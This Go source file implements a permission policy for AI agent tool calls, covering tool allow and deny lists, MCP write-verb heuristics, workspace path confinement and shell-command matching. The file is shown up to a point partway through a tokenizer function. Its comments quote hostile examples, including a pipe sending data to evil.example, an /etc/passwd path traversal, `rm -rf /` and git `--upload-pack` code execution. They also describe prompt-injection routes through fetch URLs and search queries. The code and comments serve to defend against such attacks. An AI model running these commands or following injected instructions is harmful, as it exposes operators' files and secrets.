package provider

import (
	"encoding/json"
	"path/filepath"
	"regexp"
	"strconv"
	"strings"
)

// AlwaysAllowed lists tool names that are permitted regardless of a
// PermissionPolicy's Bash allow-list. Kept as a package-level set so later
// tasks (provider adapters) can read it directly.
//
// Two naming conventions share the set. The capitalised names are Claude
// Code's and Codex's; the lower-case ones are the tools Sirdar's own agent
// loop offers (internal/agenttools), which this same policy judges. Both
// halves are read-only — they look at the workspace and at the network and
// change neither — so a name missing from here is refused, which is how
// the four agenttools names came to be added: without them every read the
// loop's model attempted fell through to "not permitted".
//
// WebFetch and web_fetch used to be here and are not any more. They are
// read-only in the sense that matters to a filesystem and not in the sense
// that matters to a support ticket: the destination is chosen per call, so
// approving one unseen lets text a read tool pulled in decide where what
// the session knows is sent. They go through decideFetch and
// permissions.fetch instead (see FetchTools).
//
// WebSearch stays. It carries a query, not a URL, so there is no
// destination to judge — which also means the query text is a residual
// channel: an injected instruction can put what the session read into a
// search term. Nothing in the allow-list closes that; see docs/config.md.
//
// Read, Glob, Grep and LS are still here, and being here is now only half
// their permission: the name says the call changes nothing, and decideRead
// says where it may look. Before that, a triage session could read any
// file on the machine — a live run read a skill file out of the operator's
// home directory — because the tool's name was the whole decision.
var AlwaysAllowed = map[string]bool{
	"Read":             true,
	"Glob":             true,
	"Grep":             true,
	"LS":               true,
	"WebSearch":        true,
	"TodoWrite":        true,
	"Task":             true,
	"StructuredOutput": true,

	"read_file": true,
	"list_dir":  true,
	"grep":      true,
	"glob":      true,
}

// AlwaysDenied lists tool names that are always refused because Sirdar
// triage runs are read-only.
var AlwaysDenied = map[string]bool{
	"Edit":         true,
	"Write":        true,
	"MultiEdit":    true,
	"NotebookEdit": true,
}

// fixAllowed lists the editing tools a fix run may use, and only those: a
// fix implements the note's Proposed Fix in the workspace's source, so it
// needs Edit, Write and MultiEdit. NotebookEdit is deliberately absent —
// nothing in the flow edits a notebook, and a tool nobody needs is one
// fewer way for a prompt injection to reach a file.
//
// The lower-case names are the same two writes in Sirdar's own agent loop
// (agenttools.WriteSet), judged by this same policy.
var fixAllowed = map[string]bool{
	"Edit":      true,
	"Write":     true,
	"MultiEdit": true,

	"write_file": true,
	"edit_file":  true,
}

// writeTools are every tool name whose arguments name a file the call
// would change: the ones a fix may use, plus NotebookEdit, which it may
// not. The path check runs over all of them, so the rule does not depend
// on which names happen to be allowed today.
var writeTools = map[string]bool{
	"Edit":         true,
	"Write":        true,
	"MultiEdit":    true,
	"NotebookEdit": true,
	"write_file":   true,
	"edit_file":    true,
}

// writeArgs is every argument name an editing tool names its target with:
// Claude Code's and Codex's file_path, NotebookEdit's notebook_path, and
// the path of Sirdar's own write_file and edit_file. A call naming none of
// them is refused rather than approved unseen.
type writeArgs struct {
	FilePath     string `json:"file_path"`
	NotebookPath string `json:"notebook_path"`
	Path         string `json:"path"`
}

func (a writeArgs) target() string {
	for _, p := range []string{a.FilePath, a.NotebookPath, a.Path} {
		if strings.TrimSpace(p) != "" {
			return p
		}
	}
	return ""
}

// FixPolicy is the permission policy for a fix run: the read-only set plus
// Edit, Write and MultiEdit, with shell commands judged against the
// workspace's permissions.fixBash list rather than permissions.bash.
// Everything else is still refused, so a fix session is a triage session
// that may edit its own workspace, not an unsupervised shell.
//
// extraReserved holds the paths this run reserves on top of .git and
// .sirdar — the repository's core.hooksPath, when it sets one. See
// ReservedWrite.
func FixPolicy(root string, fixBash, mcpAllow, extraReserved []string) *PermissionPolicy {
	return &PermissionPolicy{
		Mode:          ModeFix,
		BashAllow:     fixBash,
		MCPAllow:      mcpAllow,
		Root:          root,
		ExtraReserved: extraReserved,
	}
}

// Decision is the outcome of a permission check: whether the tool call is
// allowed, and, when denied, a human-readable reason to surface to the
// agent or the operator.
type Decision struct {
	Allow   bool
	Message string
}

// mcpPrefix is the name prefix every MCP tool carries.
const mcpPrefix = "mcp__"

// mcpWriteVerbs are the words that, appearing as a whole token of an MCP
// tool's own name segment, describe a write. They are the fallback used
// when the workspace named no permissions.mcp patterns: an unconfigured
// session still sees whatever MCP servers the operator has, and
// mcp__grafana__create_incident or mcp__..._deploy_to_vercel must not be
// approved just because nobody wrote a list.
//
// The list is long on purpose, and a write word anywhere in the name wins
// over a read word beside it. The earlier shape of this rule went the
// other way — a read word made the tool a read whatever else it said —
// which approved run_query and also approved anything a server chose to
// name with a read word in it. Sirdar is read-only by construction, so the
// side to err on is refusing a query tool whose name contains `run`. A
// workspace that needs one names it in permissions.mcp, which is the whole
// rule once it is non-empty.
var mcpWriteVerbs = map[string]bool{
	"create": true, "update": true, "delete": true, "remove": true,
	"set": true, "write": true, "post": true, "put": true, "patch": true,
	"send": true, "add": true, "insert": true, "upsert": true,
	"trigger": true, "run": true, "exec": true, "execute": true,
	"apply": true, "transition": true, "assign": true, "log": true,
	"upload": true, "publish": true, "install": true, "restart": true,
	"kill": true, "pause": true, "unpause": true, "buy": true,
	"reply": true, "resolve": true, "schedule": true, "deploy": true,
	"edit": true, "change": true, "modify": true, "merge": true,
	"push": true, "commit": true, "save": true, "purchase": true,
	"revoke": true, "reset": true, "archive": true, "cancel": true,
	"close":  true,
	"manage": true, "generate": true, "enable": true, "disable": true,
	"start": true, "stop": true, "grant": true, "import": true,
	"restore": true, "rename": true, "move": true, "drop": true,
	"truncate": true, "submit": true, "approve": true, "invite": true,
	"share": true, "sync": true, "promote": true, "scale": true,
	"use": true, "input": true, "eval": true,
}

// mcpPassthroughWords mark a tool whose name describes a transport rather
// than an operation: mcp__grafana__grafana_api_request takes a method and
// a path, graphql takes a document, sql_execute takes a statement. The
// name says nothing about what the call does, and the argument decides —
// which is exactly the case the heuristic cannot judge, so it refuses.
// This is the finding that started the rewrite: grafana_api_request led
// with no verb at all and was approved.
var mcpPassthroughWords = map[string]bool{
	"request": true, "raw": true, "graphql": true, "sql": true,
	"passthrough": true, "proxy": true,
}

// mcpReadWords mark a tool as a read, but only when no write word and no
// passthrough word is in the name beside them. A tool whose name carries
// one of these and nothing else is asking for data back: read_query,
// list_tables and describe_table on an oxo-mysql server, query_loki_logs
// on Grafana.
//
// This is the exemption, not the default: since MCPLooksLikeWrite's tail
// case now denies a name carrying none of these, a name has to earn a read
// classification by containing one of them (and no write or passthrough
// word beside it), rather than merely avoid a write word.
var mcpReadWords = map[string]bool{
	"query": true, "select": true, "read": true, "search": true,
	"list": true, "get": true, "find": true, "describe": true,
	"show": true, "fetch": true, "view": true, "lookup": true,
	"count": true, "check": true, "status": true, "health": true,
	"summary": true, "metadata": true, "label": true, "labels": true,
	"names": true, "values": true, "history": true, "analyze": true,
	"analyse": true, "suggest": true, "explain": true, "diff": true,
	"log": true, "blame": true, "grep": true, "cat": true, "head": true,
	"tail": true, "ls": true, "tree": true, "peek": true, "watch": true,
	"inspect": true,
}

// camelBoundary finds a lower-to-upper transition, so a camelCase tool
// name (createTicket) is tested by the same underscore-separated rule as a
// snake_case one (create_ticket).
var camelBoundary = regexp.MustCompile(`([a-z0-9])([A-Z])`)

// PermissionPolicy decides whether a provider may run a given tool call.
// BashAllow is a list of glob patterns (see MatchGlob) matched against each
// segment of the Bash command, as MatchCommand defines it; MCPAllow is a
// list of glob patterns matched against an MCP tool's full name; Root is
// the workspace directory a shell command is expected to stay inside.
type PermissionPolicy struct {
	BashAllow []string
	MCPAllow  []string
	Root      string

	// FetchAllow holds the host globs from permissions.fetch, matched
	// against the host of every URL a fetch tool names (see
	// DecideFetchURL). Empty — the default — means no host is fetchable:
	// a workspace that has not said where a session may fetch from has not
	// said "anywhere".
	FetchAllow []string

	// ExtraReserved names directories this run refuses writes to on top of
	// .git and .sirdar: the repository's core.hooksPath when it sets one,
	// which is an ordinary-looking source directory git runs code from.
	ExtraReserved []string

	// ReadRoots names the directories a read-class tool may reach besides
	// Root: this run's own directory and the bundle staged inside it,
	// which a fix session's worktree does not contain. See ReadScope.
	ReadRoots []string

	// ReadAlso holds the globs from permissions.readAlso, which widen the
	// read scope to paths outside every root — a shared runbook
	// directory, a skills tree. Empty, the default, widens nothing.
	ReadAlso []string

	// Mode is ModeTriage (the zero value) for a read-only run and ModeFix
	// for a run allowed to edit the workspace.
	Mode Mode
}

// IsFix reports whether this policy is a fix policy.
func (p *PermissionPolicy) IsFix() bool { return p != nil && p.Mode.IsFix() }

// Decide applies the policy rules to one tool call.
func (p *PermissionPolicy) Decide(tool string, input json.RawMessage) Decision {
	if strings.HasPrefix(tool, mcpPrefix) {
		return p.decideMCP(tool)
	}
	// Before FetchTools, for a triage run: AlwaysDenied is a tool that is
	// never permitted, and that has to hold whatever else its name also
	// matches, rather than depend on FetchTools and AlwaysDenied staying
	// disjoint forever. A fix run is not judged here — Edit, Write and
	// MultiEdit are AlwaysDenied for a triage run and fixAllowed for a fix
	// one, and the IsFix block below is what tells those two apart.
	if AlwaysDenied[tool] && !p.IsFix() {
		return Decision{Allow: false, Message: "Sirdar policy: triage runs are read-only"}
	}
	// Before AlwaysAllowed, because a fetch is the one read whose
	// destination the caller chooses: the tool name approves nothing on
	// its own, only the URL in its arguments does.
	if FetchTools[tool] {
		return p.decideFetch(tool, input)
	}
	// Before AlwaysAllowed for the same reason a fetch is: being a read
	// approves the tool, not the target. A read tool takes an absolute
	// path, so where it looks is judged on every call (see decideRead).
	if IsReadTool(tool) {
		return p.decideRead(tool, input)
	}
	if AlwaysAllowed[tool] {
		return Decision{Allow: true}
	}
	if p.IsFix() {
		if fixAllowed[tool] {
			return p.decideWrite(tool, input)
		}
		if writeTools[tool] {
			return Decision{Allow: false, Message: "Sirdar policy: " + tool +
				" is not one of the editing tools a fix may use"}
		}
	}
	if fixAllowed[tool] {
		return Decision{Allow: false, Message: "Sirdar policy: triage runs are read-only"}
	}
	// "Bash" is Claude Code's and Codex's name for the shell tool; "bash"
	// is the one Sirdar's own loop uses. Both are judged by the same
	// allow-list, since it is the command that matters, not who asked.
	if tool == "Bash" || tool == "bash" {
		var args struct {
			Command string `json:"command"`
		}
		_ = json.Unmarshal(input, &args)
		return p.decideBash(args.Command)
	}
	return Decision{Allow: false, Message: "Sirdar policy: tool " + tool + " is not permitted"}
}

// decideWrite judges where an editing tool would write. Being named in
// fixAllowed is only half the permission: a fix session runs a provider CLI
// whose Edit and Write take an absolute path, so without this the flow's
// one write-enabled session could edit any file on the machine.
//
// The target is resolved the same way every path argument in Sirdar is
// (ResolveWithin): relative to the workspace root, through symlinks, with
// the nearest existing ancestor standing in for a file that does not exist
// yet. Anything that does not land inside the root is refused, and so is
// anything inside .git/ — where a written hook is code the next commit runs
// — or inside the workspace's own .sirdar/, which holds the run records and
// the permission lists this policy is built from.
//
// This is the outer of two gates. Sirdar's own agent loop checks the same
// two rules again inside the tool (internal/agenttools), because a tool
// that is only as safe as the caller in front of it is not safe.
func (p *PermissionPolicy) decideWrite(tool string, input json.RawMessage) Decision {
	var args writeArgs
	_ = json.Unmarshal(input, &args)
	target := args.target()
	if target == "" {
		return Decision{Allow: false, Message: "Sirdar policy: " + tool +
			" named no file path, so where it would write cannot be checked"}
	}
	if strings.TrimSpace(p.Root) == "" {
		return Decision{Allow: false, Message: "Sirdar policy: write outside the workspace: " +
			quote(target) + " cannot be checked because the policy has no workspace root"}
	}
	real, err := ResolveWithin(p.Root, target)
	if err != nil {
		return Decision{Allow: false, Message: "Sirdar policy: write outside the workspace: " +
			quote(target) + " does not resolve to a path inside " + quote(p.Root)}
	}
	if reserved := ReservedWrite(p.Root, real, p.ExtraReserved); reserved != "" {
		return Decision{Allow: false, Message: "Sirdar policy: " + quote(target) +
			" is inside " + reserved + "/, which a fix never writes to"}
	}
	return Decision{Allow: true}
}

// decideBash allows a command only when MatchCommand does, and otherwise
// composes a denial that names the rule a workspace operator can actually
// go change, not just the one segment that tripped it.
//
// MatchCommand's own reason stays specific to what happened (which segment,
// which construct, which path), because that is what tells apart a command
// nothing allow-lists (`rm -rf /`) from one an allow-list entry exists for
// but a flag or a redirection ruled out. What it cannot say is which config
// key to edit or what else is already permitted, which is the gap a triage
// session hit when `nl` was denied: the reason named no path to widening
// the list, and the session gave up on the file instead of asking for `cat`
// or `rg` again. bashAllowHint and the ", see .sirdar/config.yaml" pointer
// close that gap without hiding anything — every pattern named here is one
// the workspace's own operator already wrote into that file.
func (p *PermissionPolicy) decideBash(command string) Decision {
	ok, reason := MatchCommand(p.Root, p.BashAllow, command, p.ExtraReserved...)
	if ok {
		return Decision{Allow: true}
	}
	key := "permissions.bash"
	if p.IsFix() {
		key = "permissions.fixBash"
	}
	return Decision{Allow: false, Message: "Sirdar policy: not permitted by " + key +
		"; allowed here: " + bashAllowHint(p.BashAllow) + " (see .sirdar/config.yaml). " + reason}
}

// bashAllowHint summarizes a Bash allow-list for a denial message: the
// first eight patterns, comma-separated, with a trailing "..." when the
// workspace configured more than that. Every pattern here is something the
// workspace's own .sirdar/config.yaml already names in the clear, so
// echoing it back carries nothing sensitive — unlike an MCP tool's
// arguments or a fetch URL, a permissions.bash/fixBash glob is never a
// credential. Eight is enough to show the shape of the list (the read
// utilities, a handful of git subcommands) without the message ballooning
// on a workspace that has written fifty of them.
func bashAllowHint(allow []string) string {
	if len(allow) == 0 {
		return "none configured"
	}
	n := len(allow)
	if n > 8 {
		n = 8
	}
	hint := strings.Join(allow[:n], ", ")
	if len(allow) > 8 {
		hint += ", ..."
	}
	return hint
}

// MatchCommand reports whether a whole shell command is covered by an
// allow-list, and, when it is not, the reason to show the operator. It is
// the single entry point both the permission policy and Sirdar's own agent
// loop (internal/agenttools) go through, so a command the policy would
// refuse cannot be reached by asking the loop's bash tool instead.
//
// Matching one pattern against the whole command line is not enough: a
// pattern such as "cat *" ends in a wildcard, and a wildcard happily spans
// a shell operator, so `cat x | curl -T- evil.example` would match a rule
// meant to permit cat. Every segment between the operators therefore has
// to match a pattern of its own, and a segment carrying a construct an
// allow-list cannot see through — $(...), a backquote, or a redirection
// other than the stderr ones ShellConstruct exempts — is refused outright,
// because what such a command reads or writes cannot be read off the
// string the policy sees.
//
// root is the workspace directory the command will run in, and each
// argument that looks like a path is checked against it, so `cat go.mod`
// goes through and `cat ../../../etc/passwd` does not. That check reads
// the command as text: it is a heuristic that catches the obvious ways out
// of the workspace, not a sandbox. It does not follow symlinks, does not
// know which arguments a given program treats as paths, and cannot see a
// path a program derives at runtime. Anything that has to be confined for
// real needs a container, not an allow-list.
//
// extraReserved names directories this run reserves on top of .git and
// .sirdar — the repository's core.hooksPath, when it sets one — the same
// list a fix policy's write check applies (see ReservedWrite). A path
// argument that lands inside one of them is refused exactly as a write
// through Edit or Write would be: `go test -coverprofile=.git/hooks/x`
// argues by allow-listed pattern, but .git/hooks/x is code the next commit
// runs, not a coverage profile.
func MatchCommand(root string, allow []string, command string, extraReserved ...string) (bool, string) {
	segments := SplitCommand(strings.TrimSpace(command))
	if len(segments) == 0 {
		return false, "empty command"
	}
	for _, original := range segments {
		// The inert global git flags come off first, so every check below
		// — the flag denials as much as the allow-list itself — reads the
		// command git will actually carry out. The operator's own text is
		// what a denial quotes back, because that is what they wrote.
		segment := normaliseGitFlags(original)
		if construct := ShellConstruct(segment); construct != "" {
			return false, quote(segment) + " uses " + construct +
				"; a read-only run allows no redirection or " +
				"substitution other than 2>&1 and 2>/dev/null"
		}
		if denial := gitDenial(segment); denial != "" {
			return false, denial
		}
		if denial := findDenial(segment); denial != "" {
			return false, denial
		}
		if denial := sedDenial(segment); denial != "" {
			return false, denial
		}
		matched := false
		for _, pattern := range allow {
			if MatchGlob(pattern, segment) {
				matched = true
				break
			}
		}
		if !matched {
			return false, quote(original) + " is not in the allow-list; " +
				"every segment of a pipeline or compound command has to match"
		}
		if escape := escapesRoot(root, extraReserved, segment); escape != "" {
			return false, escape
		}
	}
	return true, ""
}

// escapesRoot reports the first argument of a segment that names a path
// outside root, or a flag's value that names a path reserved against
// writes (see ReservedWrite), as the reason to show the operator, or ""
// when neither applies. See MatchCommand on how far this reaches: it reads
// the command as text.
//
// The root-escape checks (climbing out with "../", an absolute path
// outside root, a "~") apply to every token, as they always have: any of
// them can be the workspace-relative argument an ordinary command reads or
// writes. The reserved-directory check is narrower, and deliberately so —
// it applies only to a token that is plausibly the value of a flag (joined
// with "=", as in `--coverprofile=.git/hooks/pre-commit`, or the token
// right after a bare flag, as in `-o .githooks`), not to every in-root
// argument. `cd .sirdar/runs && ls -la` is a triage session reading its
// own run records, not a write, and treating its plain positional argument
// the same as a build's output flag would refuse that alongside the
// output-flag cases this rule exists for.
func escapesRoot(root string, extraReserved []string, segment string) string {
	previousBareFlag := false
	for _, arg := range argTokens(segment) {
		isFlagValue := previousBareFlag
		previousBareFlag = false
		if arg == "" {
			continue
		}
		if strings.HasPrefix(arg, "-") {
			// A flag carrying its value in the same token hides a path
			// from a check that skipped every token starting with "-":
			// `git diff --output=/Users/you/.zshrc` matched a `git diff*`
			// pattern and wrote outside the workspace. The value half is
			// judged like any other argument.
			_, value, ok := strings.Cut(arg, "=")
			if !ok || value == "" {
				// A bare flag with no "=" in this token: whatever value it
				// takes, if any, is the next token. Mark it so the
				// reserved-directory check below can tell "-o .githooks"
				// apart from an ordinary positional argument like `cd
				// .sirdar/runs`, without also needing to know the flag's
				// name or whether it takes a value at all.
				previousBareFlag = true
				continue
			}
			arg = value
			isFlagValue = true
		}
		switch {
		case strings.HasPrefix(arg, "~"):
			// The shell would expand this to a home directory the
			// workspace is not inside; the policy only ever sees the "~".
			return "the path " + quote(arg) + " is outside the workspace root, which is as far as a shell command reaches"
		case filepath.IsAbs(arg):
			if root == "" {
				continue
			}
			if !withinRoot(root, arg) {
				return "the path " + quote(arg) + " is outside the workspace root " + quote(root)
			}
			if isFlagValue {
				if reserved := reservedArgument(root, extraReserved, arg); reserved != "" {
					return "the path " + quote(arg) + " is inside " + reserved + "/, which a fix never writes to"
				}
			}
		default:
			if clean := filepath.Clean(arg); clean == ".." || strings.HasPrefix(clean, "../") {
				return "the path " + quote(arg) + " climbs out of the workspace root, which is as far as a shell command reaches"
			}
			if root == "" {
				continue
			}
			if isFlagValue {
				if reserved := reservedArgument(root, extraReserved, arg); reserved != "" {
					return "the path " + quote(arg) + " is inside " + reserved + "/, which a fix never writes to"
				}
			}
		}
	}
	return ""
}

// reservedArgument reports the reserved directory a path argument lies
// inside, the same way a write through Edit or Write would be judged: arg
// is resolved to an absolute path (joined onto root first when it is
// relative) and through symlinks — via EvalNearest, walking up to the
// nearest existing ancestor for a target that does not exist yet — before
// ReservedWrite compares it against root and extraReserved.
//
// The resolution matters on its own: ReservedWrite resolves root's own
// symlinks internally (absEval), and on a filesystem where the workspace
// sits under a symlinked ancestor — /var is a symlink to /private/var on
// the macOS this ran on during development — an unresolved path built by
// joining onto the raw root never matches that resolved root, and every
// comparison silently reports "not reserved".
func reservedArgument(root string, extraReserved []string, arg string) string {
	candidate := arg
	if !filepath.IsAbs(candidate) {
		candidate = filepath.Join(root, candidate)
	}
	real, err := EvalNearest(candidate)
	if err != nil {
		real = filepath.Clean(candidate)
	}
	return ReservedWrite(root, real, extraReserved)
}

// gitDeniedFlagsAnywhere are the git options no allow-list pattern can
// approve, wherever they fall in the invocation, because each moves where
// git writes its output or which program it runs in git's place for the
// subcommand it rides on: `git diff --output=~/.zshrc` writes a file the
// allow-list thought it was only reading, and `git fetch
// --upload-pack=/tmp/evil` or `git push --receive-pack=/tmp/evil` run an
// arbitrary program instead of git's own upload-pack/receive-pack. Unlike
// gitDeniedFlagsBeforeSubcommand, git accepts these after the subcommand
// too, so a position-scoped check would miss them there.
//
// The denial is by flag name, over every git invocation, whatever pattern
// matched it: a workspace that allow-lists `git diff*` is saying it wants
// to read the repository, not that it has audited every flag git accepts.
var gitDeniedFlagsAnywhere = map[string]bool{
	"--output":           true,
	"--output-directory": true,
	"-o":                 true,
	"--upload-pack":      true,
	"--receive-pack":     true,
}

// gitDeniedFlagsBeforeSubcommand are top-level git options, valid only
// before the subcommand name, that move where every git command which
// follows reads its configuration or runs code from: -c sets a config
// value, -C/--git-dir/--work-tree point git at a different repository,
// --exec-path changes which git-* binaries run, and --config-env reads a
// config value out of an environment variable the caller names. Denying
// them only in that position — sawSubcommand tracks it below — is what
// lets `git grep -c foo` (counts matches) and `git rev-parse --git-dir`
// (prints a path) through: both reuse "-c"/"--git-dir" as an ordinary
// subcommand flag with an unrelated meaning, valid only after the
// subcommand, which a denial that fired anywhere could not tell apart from
// git's own top-level flag of the same name.
var gitDeniedFlagsBeforeSubcommand = map[string]bool{
	"-c":           true,
	"-C":           true,
	"--git-dir":    true,
	"--work-tree":  true,
	"--exec-path":  true,
	"--config-env": true,
}

// gitDenial reports why a git command segment is refused outright, or ""
// when nothing in it is. Besides the flags, `git config` is refused: it
// writes the very settings — core.hooksPath among them — that decide what
// the next git command does.
//
// Before looking for the git word, gitDenial skips a leading `env` token
// and any number of leading NAME=value assignments — the two shapes a
// shell accepts in front of a program name — so `GIT_DIR=/tmp/x git log`
// and `env GIT_DIR=/tmp/x git log` are recognised as git invocations and
// judged by the same flag rules as `git --git-dir=/tmp/x log`, rather than
// slipping through because the first token was not literally "git". Any
// assignment that names a GIT_* variable is refused outright, whatever
// runs after it: GIT_DIR, GIT_WORK_TREE and GIT_CONFIG (among others) move
// the same configuration a denied -c/--git-dir flag would, and they do it
// for a git command a build tool invokes internally just as much as for
// one typed directly on the command line.
func gitDenial(segment string) string {
	args := argTokens(segment)
	if len(args) == 0 {
		return ""
	}
	i := 0
	if args[0] == "env" || strings.HasSuffix(args[0], "/env") {
		i = 1
	}
	for i < len(args) {
		name, value, ok := envAssignment(args[i])
		if !ok {
			break
		}
		if strings.HasPrefix(name, "GIT_") {
			return quote(segment) + " sets " + quote(name+"="+value) +
				" before the command runs, which reaches the same git configuration a denied " +
				"-c/--git-dir flag would; no allow-list pattern approves it"
		}
		i++
	}
	if i >= len(args) || !isGit(args[i]) {
		return ""
	}
	sawSubcommand := false
	for _, arg := range args[i+1:] {
		if !strings.HasPrefix(arg, "-") {
			if !sawSubcommand {
				sawSubcommand = true
				if arg == "config" {
					return quote(segment) + " runs `git config`, which writes the settings " +
						"(core.hooksPath among them) that decide what every later git command does"
				}
			}
			continue
		}
		flag := arg
		if name, _, ok := strings.Cut(arg, "="); ok {
			flag = name
		}
		if gitDeniedFlagsAnywhere[flag] {
			return quote(segment) + " passes git " + quote(flag) +
				", which moves where git reads its configuration, writes its output, " +
				"or runs code from; no allow-list pattern approves it"
		}
		if !sawSubcommand && gitDeniedFlagsBeforeSubcommand[flag] {
			return quote(segment) + " passes git " + quote(flag) +
				" before the subcommand, which moves where git reads its configuration or runs " +
				"code from for everything that follows; no allow-list pattern approves it"
		}
	}
	return ""
}

// inertGitFlags are git's own global options that change how it prints and
// nothing about what it reads, writes or runs. --no-pager is the one every
// coding agent has learnt to pass, because git's pager on a pipe hangs the
// turn; --no-optional-locks is what a read-only probe passes so it does not
// touch the index.
var inertGitFlags = map[string]bool{
	"--no-pager":          true,
	"--no-optional-locks": true,
}

// inertGitConfig reports whether a `-c key=value` pair is one of the
// cosmetic settings, which is a much narrower question than whether the key
// is cosmetic. `core.pager` names a program git will run, so only the two
// values that run no program at all are inert; `color.ui` only takes git's
// own colour words, and anything else under either key keeps the -c that
// gitDenial then refuses.
func inertGitConfig(pair string) bool {
	key, value, ok := strings.Cut(pair, "=")
	if !ok {
		return false
	}
	switch strings.ToLower(key) {
	case "color.ui":
		switch strings.ToLower(value) {
		case "false", "true", "never", "always", "auto":
			return true
		}
	case "core.pager":
		return value == "cat" || value == ""
	}
	return false
}

// normaliseGitFlags removes the inert global flags from a git segment, so
// that `git --no-pager diff -- x` is matched against the allow-list as
// `git diff -- x` and a workspace that allow-listed `git diff*` gets what
// it asked for. Everything else is left exactly where it stood, including
// the flags that do change what the command does: -C, --git-dir and
// --work-tree point git at another repository, so they stay in the segment
// and fail the match (and gitDenial) as before.
//
// The removal is by byte range rather than by re-joining tokens, so a
// segment with nothing to strip comes back identical and one that is
// stripped keeps its quoting, spacing and everything after the subcommand.
func normaliseGitFlags(segment string) string {
	toks := spanTokens(segment)
	i := 0
	if i < len(toks) && (toks[i].text == "env" || strings.HasSuffix(toks[i].text, "/env")) {
		i++
	}
	for i < len(toks) {
		if _, _, ok := envAssignment(toks[i].text); !ok {
			break
		}
		i++
	}
	if i >= len(toks) || !isGit(toks[i].text) {
		return segment
	}

	var drop []tokenSpan
	for j := i + 1; j < len(toks); j++ {
		tok := toks[j].text
		if !strings.HasPrefix(tok, "-") {
			break // the subcommand: git takes no global options after it
		}
		switch {
		case inertGitFlags[tok]:
			drop = append(drop, toks[j])
		case tok == "-c":
			// -c always takes the next token, inert or not; skipping it
			// either way keeps a config pair from being read as the
			// subcommand.
			if j+1 < len(toks) {
				if inertGitConfig(toks[j+1].text) {
					drop = append(drop, toks[j], toks[j+1])
				}
				j++
			}
		case strings.HasPrefix(tok, "-c") && inertGitConfig(tok[2:]):
			drop = append(drop, toks[j])
		}
	}
	if len(drop) == 0 {
		return segment
	}
	return cutSpans(segment, drop)
}

// cutSpans removes the given byte ranges from s, together with the
// whitespace in front of each, leaving one separator between what is left.
// The spans must be in order and must not overlap, which is how
// normaliseGitFlags collects them.
func cutSpans(s string, spans []tokenSpan) string {
	var b strings.Builder
	prev := 0
	for _, span := range spans {
		start := span.start
		for start > prev && isBlank(s[start-1]) {
			start--
		}
		b.WriteString(s[prev:start])
		prev = span.end
	}
	b.WriteString(s[prev:])
	return b.String()
}

// envAssignment reports whether tok has the NAME=value shape a shell
// accepts in front of a program name — an identifier (letters, digits and
// underscore, not starting with a digit) followed by "=" — and, when it
// does, the name and value either side of the "=".
func envAssignment(tok string) (name, value string, ok bool) {
	name, value, ok = strings.Cut(tok, "=")
	if !ok || name == "" {
		return "", "", false
	}
	for i, r := range name {
		switch {
		case r == '_' || (r >= 'A' && r <= 'Z') || (r >= 'a' && r <= 'z'):
		case i > 0 && r >= '0' && r <= '9':
		default:
			return "", "", false
		}
	}
	return name, value, true
}

// isGit reports whether a command word invokes git, by the name or by a
// path ending in it.
func isGit(word string) bool {
	word = strings.TrimSuffix(word, ".exe")
	return word == "git" || strings.HasSuffix(word, "/git")
}

// findDeniedFlags are find options that act on what find matches rather
// than reading it: -delete removes the file, and -exec/-execdir/-ok/-okdir
// run an arbitrary command per match — the same "policy cannot see what
// this actually does" problem $(...) is refused for, except find's version
// is a plain word a "find *" pattern would otherwise wave through.
var findDeniedFlags = map[string]bool{
	"-delete":  true,
	"-exec":    true,
	"-execdir": true,
	"-ok":      true,
	"-okdir":   true,
}

// findDenial reports why a find command segment is refused outright, or ""
// when nothing in it is. Denied wherever the flag falls, the same as
// gitDeniedFlagsAnywhere: find accepts its tests and actions in any order
// after the starting path(s).
func findDenial(segment string) string {
	args := argTokens(segment)
	if len(args) == 0 || !isFind(args[0]) {
		return ""
	}
	for _, arg := range args[1:] {
		if findDeniedFlags[arg] {
			return quote(segment) + " passes find " + quote(arg) +
				", which runs or removes what find matches instead of reading it; " +
				"no allow-list pattern approves it"
		}
	}
	return ""
}

// isFind reports whether a command word invokes find, by the name or by a
// path ending in it.
func isFind(word string) bool {
	word = strings.TrimSuffix(word, ".exe")
	return word == "find" || strings.HasSuffix(word, "/find")
}

// sedDenial reports why a sed command segment is refused outright, or ""
// when nothing in it is. -i/--in-place turns sed from a read into a write
// wherever it appears — GNU sed accepts it combined with -n as -ni, and BSD
// sed always takes a (possibly empty) backup-suffix argument right after
// it — so a "sed -n *" pattern, meant to approve only the read-only form,
// never approves an invocation carrying it.
func sedDenial(segment string) string {
	args := argTokens(segment)
	if len(args) == 0 || !isSed(args[0]) {
		return ""
	}
	for _, arg := range args[1:] {
		if arg == "--in-place" || strings.HasPrefix(arg, "--in-place=") {
			return quote(segment) + " passes sed " + quote(arg) +
				", which edits the file in place instead of reading it; " +
				"no allow-list pattern approves it"
		}
		if strings.HasPrefix(arg, "-") && !strings.HasPrefix(arg, "--") && strings.ContainsRune(arg, 'i') {
			return quote(segment) + " passes sed " + quote(arg) +
				", which edits the file in place instead of reading it; " +
				"no allow-list pattern approves it"
		}
	}
	return ""
}

// isSed reports whether a command word invokes sed, by the name or by a
// path ending in it.
func isSed(word string) bool {
	word = strings.TrimSuffix(word, ".exe")
	return word == "sed" || strings.HasSuffix(word, "/sed")
}

// withinRoot reports whether an absolute path is root or sits under it.
// Both are cleaned first; neither is resolved through symlinks.
func withinRoot(root, path string) bool {
	root, path = filepath.Clean(root), filepath.Clean(path)
	return path == root || strings.HasPrefix(path, root+string(filepath.Separator))
}

// argTokens splits a command segment into whitespace-separated arguments
// with their quotes removed, which is as much of the shell's own word
// splitting as a policy needs to see the paths in a command.
func argTokens(segment string) []string {
	spans := spanTokens(segment)
	out := make([]string, 0, len(spans))
	for _, span := range spans {
		out = append(out, span.text)
	}
	return out
}

// tokenSpan is one argument of a segment: its unquoted text, and the byte
// range of the segment it came from, so an edit can put the segment back
// together without re-quoting anything.
type tokenSpan struct {
	text  string
	start int
	end   int
}

// spanTokens is argTokens with the offsets kept.
func spanTokens(segment string) []tokenSpan {
	var (
		out   []tokenSpan
		cur   strings.Builder
		quote = byte(0)
		open  bool
		start int
	)
	flush := func(end int) {
		if open {
			out = append(out, tokenSpan{text: cur.String(), start: start, end: end})
		}
		cur.Reset()
		open = false
	}
	begin := func(i int) {
		if !open {
			start = i
			open = true
		}
	}
	for i := 0; i < len(segment); i++ {
		ch := segment[i]
		switch {
		case quote != 0:
			if ch == quote {
				quote = 0
				continue
			}
			begin(i)
			cur.WriteByte(ch)
		case ch == '\'' || ch == '"':
			begin(i)
			quote = ch
		case ch == '\\' && i+1 < len(segment):
			begin(i)
			i++
			cur.WriteByte(segment[i])
		case ch == ' ' || ch == '\t':
			flush(i)
		default:
